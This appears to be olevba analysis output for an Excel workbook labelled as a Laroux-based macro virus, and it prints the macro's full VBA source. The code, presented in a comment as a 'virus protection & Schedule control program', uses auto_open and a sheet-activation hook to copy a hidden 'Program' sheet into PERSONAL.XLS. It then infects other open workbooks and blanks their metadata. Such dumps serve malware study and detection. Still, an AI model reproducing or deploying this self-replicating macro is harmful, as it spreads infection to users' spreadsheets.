olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-990ccac8f88709eddc327d0a72ca8a9c9bfbe2a0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Program.bas 
in file: Virus.MSExcel.Laroux-based-990ccac8f88709eddc327d0a72ca8a9c9bfbe2a0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Program'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













'
' This macro program for virus protection & Schedule control program
'       by Burinthorn  Thong-o.
'
'
'This part for declaration globle variable
'
Dim First_col, Last_col As Integer
    Const start_row = 22
    Const finish_row = 66
    Const start_col = 18
    Const finish_col = 50
'
'end section
'

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    Select Case whichfile
    Case 10
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        Sheets("Program").Visible = True
        Sheets("Program").Select
        Sheets("Program").Copy
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", _
                FileFormat:=xlNormal, Password:="", WriteResPassword:="", _
                ReadOnlyRecommended:=False, CreateBackup:=False
        ChDir c4$
        Workbooks(n4$).Sheets("Program").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "Program" Then
            Workbooks("PERSONAL.XLS").Sheets("Program").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks(n4$).Sheets("Program").Visible = False
        Else
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
    End Select
End Sub

Function Get_rng(Pmt)
Attribute Get_rng.VB_ProcData.VB_Invoke_Func = " \n14"
    Set Get_rng = Application.InputBox(prompt:=Pmt, _
        Title:="Input Range Dialoque!", Type:=8)
End Function

Function actv_sheet(sht)
Attribute actv_sheet.VB_ProcData.VB_Invoke_Func = " \n14"
    If Not (Worksheets(sht).Activate) Then
        Worksheets(sht).Select
    End If
End Function

Function Begin_col(Rw) As Integer
Attribute Begin_col.VB_ProcData.VB_Invoke_Func = " \n14"
Dim counter As Integer
    counter = 1
    Do While (Cells(Rw, counter).Interior.ColorIndex = xlNone)
        counter = counter + 1
        If counter > 49 Then
            Exit Do
        End If
    Loop
    Begin_col = counter
    If Begin_col < First_col Then
        First_col = Begin_col
    End If
End Function

Function End_col(Rw, Beg)
Attribute End_col.VB_ProcData.VB_Invoke_Func = " \n14"
Dim i As Integer
    For i = Beg To 50 Step 1
        If Cells(Rw, i).Interior.ColorIndex = xlNone Then
            Exit For
        End If
    End_col = i
    Next i
    If End_col > Last_col Then
        Last_col = End_col
    End If
End Function

Function Put_on(Rw, fag)
Attribute Put_on.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Beg_time, End_time As Integer
    If Not (Cells(Rw, 5).Value = "") Then
        Beg_time = Begin_col(Rw)
        End_time = End_col(Rw, Beg_time)
        If (fag = "Y" And Beg_time < 50) Then
            Week = End_time - Beg_time + 1
            PerC = (Cells(Rw, 5).Value) / Week
            Range(Cells(Rw, Beg_time), Cells(Rw, _
                End_time)).Value = PerC
        End If
    End If
End Function

Sub main()
Attribute main.VB_ProcData.VB_Invoke_Func = " \n14"
    If Not (Toolbars("Sch_cont").Visible) Then
        Toolbars("Sch_cont").Visible = True
    End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Progra
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

